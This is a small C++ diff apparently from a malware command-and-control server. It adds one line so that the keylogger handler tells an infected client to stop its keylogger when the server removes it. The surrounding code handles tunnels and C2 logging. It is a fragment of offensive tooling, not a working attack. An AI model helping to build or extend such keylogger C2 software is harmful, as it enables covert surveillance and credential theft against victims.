@@ -391,6 +391,7 @@ void CommandHandler::keylogger() {
         if (p_tunnel != nullptr) {
             uint64_t u = 1;
             write(*(p_tunnel->p_tunnel_shutdown_fd_), &u, sizeof(u));
+            send_client(KEYLOGGER, 0, client_index);
             *p_event_log_ << LOG_MUST << GREEN << "[CommandHandler::keylogger] Keylogger removed from client " << client_index << RESET_C2_FIFO;
         } else {
             *p_event_log_ << LOG_MUST << RED << "CommandHandler::keylogger] Keylogger is not active for client " << client_index << RESET_C2_FIFO; 
